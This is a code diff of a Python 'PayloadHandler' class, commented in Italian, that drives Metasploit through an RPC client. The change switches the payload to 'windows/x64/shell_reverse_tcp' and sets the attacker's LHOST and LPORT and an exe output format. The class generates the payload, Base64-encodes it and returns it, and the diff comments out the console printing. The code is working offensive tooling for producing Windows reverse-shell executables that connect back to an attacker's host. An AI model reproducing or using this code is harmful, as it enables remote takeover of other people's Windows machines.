@@ -44,9 +44,9 @@ class PayloadHandler:
         :return: Il payload in formato Base64 oppure None in caso di errore.
         """
         module_type = 'payload'
-        reverse_tcp = 'windows/x64/meterpreter/reverse_tcp'
+        reverse_tcp = 'windows/x64/shell_reverse_tcp'
         platform = 'windows'
-        architecture = 'x64'
+        eformat = 'exe'
 
         try:
             if self.client is None:
@@ -55,10 +55,11 @@ class PayloadHandler:
 
             # Carica il modulo del payload e configura le opzioni
             payload = self.client.modules.use(module_type, reverse_tcp)
-            payload['LHOST'] = lhost
-            payload['LPORT'] = lport
+            payload.runoptions['LHOST'] = lhost
+            payload.runoptions['LPORT'] = lport
             payload.runoptions['Platform'] = platform
-            payload.runoptions['Architecture'] = architecture
+            payload.runoptions['Format'] = eformat
+
 
             # Genera il payload
             generated_payload = payload.payload_generate()
@@ -68,9 +69,9 @@ class PayloadHandler:
 
             # Codifica il payload in Base64
             payload_b64 = b64.b64encode(generated_payload).decode('utf-8')
-            wrapped_payload = "\n".join(textwrap.wrap(payload_b64, width=60))
-            self.logging.info("Payload generato e codificato in Base64:")
-            console.print(wrapped_payload, style="blue", markup=False, highlight=False)
+            #wrapped_payload = "\n".join(textwrap.wrap(payload_b64, width=60))
+            #self.logging.info("Payload generato e codificato in Base64:")
+            #console.print(wrapped_payload, style="blue", markup=False, highlight=False)
             return payload_b64
 
         except Exception as e:
